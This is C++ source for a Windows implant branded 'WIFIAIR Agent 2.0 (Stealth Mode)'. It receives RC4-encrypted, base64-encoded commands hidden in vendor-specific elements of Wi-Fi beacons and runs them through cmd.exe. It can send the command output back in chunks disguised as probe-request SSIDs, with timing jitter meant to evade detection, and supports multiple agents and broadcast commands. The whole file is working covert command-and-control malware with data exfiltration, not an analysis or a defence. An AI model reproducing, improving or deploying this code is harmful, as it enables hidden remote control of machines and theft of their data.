#include <windows.h>
#include <wlanapi.h>
#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <set>
#include <algorithm>
#include <cstdio>

#pragma comment(lib, "wlanapi.lib")

// --- CONFIG ---
const BYTE C2_OUI[] = { 0x00, 0x40, 0x96 };
const BYTE EXFIL_OUI[] = { 0x00, 0x40, 0x97 };
const BYTE RC4_KEY[] = { 0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF,
                         0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01 };
const size_t RC4_KEY_LEN = sizeof(RC4_KEY);

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// --- GLOBAL STATE ---
BYTE g_AgentId = 0;                // This agent's ID (0 = accept all)
unsigned short g_CurrentJobId = 0;
std::string g_CurrentOutput = "";
bool g_HasDataToExfil = false;
bool g_ExfilEnabled = false;
DWORD g_ExfilDurationMs = 0;

HANDLE g_hScanComplete = NULL;

// --- JITTER CONFIGURATION ---
DWORD g_ExfilJitterMin = 2500;   // Min delay between exfil chunks (ms)
DWORD g_ExfilJitterMax = 3500;   // Max delay between exfil chunks (ms)

// --- UTILITY ---
DWORD Jitter(DWORD minMs, DWORD maxMs) {
    return minMs + (rand() % (maxMs - minMs + 1));
}

// --- CRYPTO UTILS ---
void RC4(const BYTE* key, size_t keyLen, BYTE* data, size_t dataLen) {
    BYTE S[256];
    for (int i = 0; i < 256; i++) S[i] = (BYTE)i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keyLen]) % 256;
        std::swap(S[i], S[j]);
    }
    int ii = 0; j = 0;
    for (size_t n = 0; n < dataLen; n++) {
        ii = (ii + 1) % 256;
        j = (j + S[ii]) % 256;
        std::swap(S[ii], S[j]);
        data[n] ^= S[(S[ii] + S[j]) % 256];
    }
}

std::vector<BYTE> Base64Decode(const std::string& encoded) {
    std::vector<BYTE> ret;
    int i = 0, in_ = 0;
    int in_len = (int)encoded.size();
    BYTE char_array_4[4], char_array_3[3];
    while (in_len-- && (encoded[in_] != '=') && (isalnum(encoded[in_]) || encoded[in_] == '+' || encoded[in_] == '/')) {
        char_array_4[i++] = encoded[in_++];
        if (i == 4) {
            for (i = 0; i < 4; i++) char_array_4[i] = (BYTE)base64_chars.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; i < 3; i++) ret.push_back(char_array_3[i]);
            i = 0;
        }
    }
    if (i) {
        for (int jj = i; jj < 4; jj++) char_array_4[jj] = 0;
        for (int jj = 0; jj < 4; jj++) char_array_4[jj] = (BYTE)base64_chars.find(char_array_4[jj]);
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        for (int jj = 0; jj < i - 1; jj++) ret.push_back(char_array_3[jj]);
    }
    return ret;
}

std::string Base64Encode(const std::vector<BYTE>& data) {
    std::string ret;
    int i = 0;
    BYTE char_array_3[3], char_array_4[4];
    size_t len = data.size();
    const BYTE* bytes = data.data();
    while (len--) {
        char_array_3[i++] = *(bytes++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for (i = 0; i < 4; i++) ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if (i) {
        for (int jj = i; jj < 3; jj++) char_array_3[jj] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        for (int jj = 0; jj < i + 1; jj++) ret += base64_chars[char_array_4[jj]];
        while (i++ < 3) ret += '=';
    }
    return ret;
}

// --- EXECUTE COMMAND ---
std::string ExecCommand(const std::string& cmd) {
    std::string result;
    char buffer[4096];
    std::string fullCmd = "cmd.exe /c " + cmd + " 2>&1";
    FILE* pipe = _popen(fullCmd.c_str(), "r");
    if (!pipe) return "ERROR: Failed to execute";
    while (fgets(buffer, sizeof(buffer), pipe)) result += buffer;
    _pclose(pipe);
    if (result.empty()) result = "[No output]";
    return result;
}

// --- FULL EXFIL SEQUENCE (With Timeout Check) ---
// Exfil header: EXFIL_OUI(3) + AGENT_ID(1) + JOB_ID(2) + SEQ(2) + TOTAL(2) = 10 bytes
const int MAX_RETRIES = 3;
const DWORD RETRY_DELAY = 3000;  // ms between retries

void SendExfilSequence(HANDLE hClient, GUID* pGuid) {
    Sleep(1500);
    DWORD startTime = GetTickCount();
    std::vector<BYTE> toEncrypt(g_CurrentOutput.begin(), g_CurrentOutput.end());
    RC4(RC4_KEY, RC4_KEY_LEN, toEncrypt.data(), toEncrypt.size());
    std::string b64 = Base64Encode(toEncrypt);

    const size_t CHUNK_SIZE = 21;  // Reduced by 1 for agent ID byte
    unsigned short total = (unsigned short)((b64.size() + CHUNK_SIZE - 1) / CHUNK_SIZE);

    for (int i = 0; i < total; i++) {
        if (GetTickCount() - startTime > g_ExfilDurationMs) {
            return;
        }

        unsigned short seq = i + 1;
        size_t start = i * CHUNK_SIZE;
        size_t len = min(CHUNK_SIZE, b64.size() - start);
        std::string chunk = b64.substr(start, len);

        DOT11_SSID ssid = { 0 };
        ssid.ucSSID[0] = EXFIL_OUI[0];
        ssid.ucSSID[1] = EXFIL_OUI[1];
        ssid.ucSSID[2] = EXFIL_OUI[2];
        ssid.ucSSID[3] = g_AgentId;  // Agent ID in response
        ssid.ucSSID[4] = (g_CurrentJobId >> 8) & 0xFF;
        ssid.ucSSID[5] = g_CurrentJobId & 0xFF;
        ssid.ucSSID[6] = (seq >> 8) & 0xFF;
        ssid.ucSSID[7] = seq & 0xFF;
        ssid.ucSSID[8] = (total >> 8) & 0xFF;
        ssid.ucSSID[9] = total & 0xFF;
        memcpy(&ssid.ucSSID[10], chunk.c_str(), len);
        ssid.uSSIDLength = 10 + (ULONG)len;

        // Retry loop for this chunk
        bool success = false;
        for (int retry = 0; retry < MAX_RETRIES && !success; retry++) {
            if (GetTickCount() - startTime > g_ExfilDurationMs) {
                return;  // Timeout, exit entirely
            }

            DWORD result = WlanScan(hClient, pGuid, &ssid, NULL, NULL);

            if (result == ERROR_SUCCESS) {
                std::cout << "." << std::flush;
                success = true;
            }
            else {
                std::cout << "!" << std::flush;
                if (retry < MAX_RETRIES - 1) {
                    Sleep(RETRY_DELAY);  // Wait before retry
                }
            }
        }

        if (!success) {
            std::cout << "X" << std::flush;  // All retries failed
        }

        // Jittered delay between chunks
        Sleep(Jitter(g_ExfilJitterMin, g_ExfilJitterMax));
    }

    std::cout << " [SEQ]" << std::endl;
    Sleep(Jitter(500, 1500));  // Jittered delay before next sequence
}

// --- PARSING & LOGIC ---
// C2 header: C2_OUI(3) + AGENT_ID(1) + JOB_ID(2) + SEQ(2) + TOTAL(2) = 10 bytes
struct JobBuffer {
    unsigned short total_chunks;
    std::map<unsigned short, std::string> parts;
    DWORD timestamp;
};
std::map<unsigned short, JobBuffer> active_jobs;
std::set<unsigned short> completed_jobs;

void ParseVSE(HANDLE hClient, GUID* pGuid, PBYTE pRawData, DWORD dwSize) {
    DWORD now = GetTickCount();
    for (auto it = active_jobs.begin(); it != active_jobs.end(); ) {
        if (now - it->second.timestamp > 60000) it = active_jobs.erase(it); else ++it;
    }

    DWORD offset = 0;
    while (offset < dwSize) {
        if (offset + 2 > dwSize) break;
        BYTE ieID = pRawData[offset];
        BYTE ieLen = pRawData[offset + 1];
        PBYTE ieData = &pRawData[offset + 2];
        if (offset + 2 + ieLen > dwSize) break;

        // New header: OUI(3) + AgentID(1) + JobID(2) + Seq(2) + Total(2) = 10 bytes min
        if (ieID == 221 && ieLen >= 10 && memcmp(ieData, C2_OUI, 3) == 0) {
            BYTE targetAgent = ieData[3];

            // Check if this command is for us
            // targetAgent 0 = broadcast to all
            // Otherwise must match our ID
            if (targetAgent != 0 && targetAgent != g_AgentId) {
                offset += (2 + ieLen);
                continue;  // Not for us, skip
            }

            unsigned short jobId = (ieData[4] << 8) | ieData[5];
            unsigned short seq = (ieData[6] << 8) | ieData[7];
            unsigned short total = (ieData[8] << 8) | ieData[9];

            if (completed_jobs.count(jobId)) { offset += (2 + ieLen); continue; }

            JobBuffer& buf = active_jobs[jobId];
            buf.total_chunks = total;
            buf.timestamp = now;
            std::string chunk((char*)(ieData + 10), ieLen - 10);

            if (buf.parts.find(seq) == buf.parts.end()) {
                buf.parts[seq] = chunk;
                if (buf.parts.size() == 1) {
                    if (targetAgent == 0)
                        std::cout << "\n[*] New Broadcast Job 0x" << std::hex << jobId << std::dec << "..." << std::endl;
                    else
                        std::cout << "\n[*] New Job 0x" << std::hex << jobId << std::dec << " (Target: Agent " << (int)targetAgent << ")" << std::endl;
                }
            }

            if (buf.parts.size() == total) {
                std::string full_b64;
                for (unsigned short i = 1; i <= total; i++) full_b64 += buf.parts[i];

                completed_jobs.insert(jobId);
                active_jobs.erase(jobId);

                try {
                    std::vector<BYTE> encrypted = Base64Decode(full_b64);
                    if (encrypted.empty()) throw std::runtime_error("Empty");
                    RC4(RC4_KEY, RC4_KEY_LEN, encrypted.data(), encrypted.size());
                    std::string cmd(encrypted.begin(), encrypted.end());

                    std::cout << "[+] EXECUTE: " << cmd << std::endl;
                    std::string output = ExecCommand(cmd);
                    std::cout << "[+] OUTPUT:\n" << output << std::endl;

                    if (g_ExfilEnabled) {
                        g_CurrentJobId = jobId;
                        g_CurrentOutput = output;
                        g_HasDataToExfil = true;
                        std::cout << "[*] Switching to Exfil Mode for " << (g_ExfilDurationMs / 1000) << "s..." << std::endl;
                    }

                }
                catch (...) { std::cout << "[-] Error" << std::endl; }
            }
        }
        offset += (2 + ieLen);
    }
}

VOID WINAPI WlanNotificationCallback(PWLAN_NOTIFICATION_DATA pData, PVOID pCtx) {
    if (pData != NULL &&
        pData->NotificationSource == WLAN_NOTIFICATION_SOURCE_ACM &&
        pData->NotificationCode == wlan_notification_acm_scan_complete) {
        SetEvent(g_hScanComplete);
    }
}

void ScanLoop() {
    HANDLE hClient = NULL;
    DWORD dwVer = 0;
    WlanOpenHandle(2, NULL, &dwVer, &hClient);
    g_hScanComplete = CreateEvent(NULL, FALSE, FALSE, NULL);
    WlanRegisterNotification(hClient, WLAN_NOTIFICATION_SOURCE_ACM, TRUE,
        (WLAN_NOTIFICATION_CALLBACK)WlanNotificationCallback, NULL, NULL, NULL);

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    WlanEnumInterfaces(hClient, NULL, &pIfList);

    if (pIfList && pIfList->dwNumberOfItems > 0) {
        GUID* pGuid = &pIfList->InterfaceInfo[0].InterfaceGuid;
        std::wcout << L"[+] Interface: " << pIfList->InterfaceInfo[0].strInterfaceDescription << std::endl;

        while (true) {
            if (g_ExfilEnabled && g_HasDataToExfil) {
                DWORD startTime = GetTickCount();

                while (GetTickCount() - startTime < g_ExfilDurationMs) {
                    SendExfilSequence(hClient, pGuid);
                }

                std::cout << "[*] Exfil Timeout Reached. Returning to Scan Mode." << std::endl;
                g_HasDataToExfil = false;
            }

            WlanScan(hClient, pGuid, NULL, NULL, NULL);
            WaitForSingleObject(g_hScanComplete, 500);

            PWLAN_BSS_LIST pBssList = NULL;
            if (WlanGetNetworkBssList(hClient, pGuid, NULL, dot11_BSS_type_any, FALSE, NULL, &pBssList) == ERROR_SUCCESS) {
                for (DWORD i = 0; i < pBssList->dwNumberOfItems; i++) {
                    PWLAN_BSS_ENTRY pEntry = &pBssList->wlanBssEntries[i];
                    if (pEntry->ulIeSize > 0)
                        ParseVSE(hClient, pGuid, (PBYTE)pEntry + pEntry->ulIeOffset, pEntry->ulIeSize);
                }
                WlanFreeMemory(pBssList);
            }
        }
    }
    CloseHandle(g_hScanComplete);
    if (pIfList) WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);
}

void PrintUsage(const char* exe) {
    std::cout << "Usage: " << exe << " [options]\n\n"
        << "Options:\n"
        << "  -agent <id>          Agent ID (1-255, required for multi-agent)\n"
        << "  -exfil               Enable response exfiltration\n"
        << "  -duration <seconds>  How long to broadcast response (Required with -exfil)\n"
        << "  -jitter <min> <max>  Exfil delay jitter in ms (default: 2000 4000)\n"
        << "  -h                   Show this help\n\n"
        << "Examples:\n"
        << "  " << exe << " -agent 1\n"
        << "  " << exe << " -agent 2 -exfil -duration 60\n"
        << "  " << exe << " -agent 1 -exfil -duration 60 -jitter 1000 3000\n\n"
        << "Notes:\n"
        << "  - Agent ID 0 is reserved for broadcast (receives all commands)\n"
        << "  - Each agent should have a unique ID (1-255)\n"
        << "  - Jitter adds random delays to avoid detection patterns\n";
}

int main(int argc, char* argv[]) {
    srand((unsigned int)GetTickCount());  // Initialize random for jitter

    bool durationSet = false;
    bool agentSet = false;

    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "-agent") {
            if (i + 1 < argc) {
                int id = std::stoi(argv[i + 1]);
                if (id < 1 || id > 255) {
                    std::cerr << "[-] Error: Agent ID must be 1-255" << std::endl;
                    return 1;
                }
                g_AgentId = (BYTE)id;
                agentSet = true;
                i++;
            }
            else {
                std::cerr << "[-] Error: -agent requires a value (1-255)" << std::endl;
                return 1;
            }
        }
        else if (arg == "-exfil") {
            g_ExfilEnabled = true;
        }
        else if (arg == "-duration") {
            if (i + 1 < argc) {
                g_ExfilDurationMs = std::stoi(argv[i + 1]) * 1000;
                durationSet = true;
                i++;
            }
            else {
                std::cerr << "[-] Error: -duration requires a value (seconds)" << std::endl;
                return 1;
            }
        }
        else if (arg == "-jitter") {
            if (i + 2 < argc) {
                g_ExfilJitterMin = std::stoi(argv[i + 1]);
                g_ExfilJitterMax = std::stoi(argv[i + 2]);
                if (g_ExfilJitterMin > g_ExfilJitterMax) {
                    std::swap(g_ExfilJitterMin, g_ExfilJitterMax);
                }
                i += 2;
            }
            else {
                std::cerr << "[-] Error: -jitter requires two values (min_ms max_ms)" << std::endl;
                return 1;
            }
        }
        else if (arg == "-h" || arg == "--help") {
            PrintUsage(argv[0]);
            return 0;
        }
    }

    if (g_ExfilEnabled && !durationSet) {
        std::cerr << "[-] Error: When using -exfil, you MUST specify -duration <seconds>" << std::endl;
        PrintUsage(argv[0]);
        return 1;
    }

    // ASCII-safe banner
    std::cout << R"(
 __        _____ _____ ___    _    ___ ____  
 \ \      / /_ _|  ___|_ _|  / \  |_ _|  _ \ 
  \ \ /\ / / | || |_   | |  / _ \  | || |_) |
   \ V  V /  | ||  _|  | | / ___ \ | ||  _ < 
    \_/\_/  |___|_|   |___/_/   \_\___|_| \_\
)" << std::endl;

    std::cout << "[*] WIFIAIR Agent 2.0 (Stealth Mode)" << std::endl;

    if (agentSet) {
        std::cout << "[*] Agent ID: " << (int)g_AgentId << std::endl;
    }
    else {
        std::cout << "[!] WARNING: No agent ID set - will receive ALL commands (including broadcasts)" << std::endl;
        std::cout << "[!] Use -agent <id> to set a unique ID for this agent" << std::endl;
    }

    if (g_ExfilEnabled) {
        std::cout << "[*] Exfil: ENABLED (Duration: " << (g_ExfilDurationMs / 1000) << "s, Jitter: "
            << g_ExfilJitterMin << "-" << g_ExfilJitterMax << "ms)" << std::endl;
    }
    else {
        std::cout << "[*] Exfil: DISABLED" << std::endl;
    }

    std::cout << "[*] Listening for commands..." << std::endl;

    ScanLoop();
    return 0;
}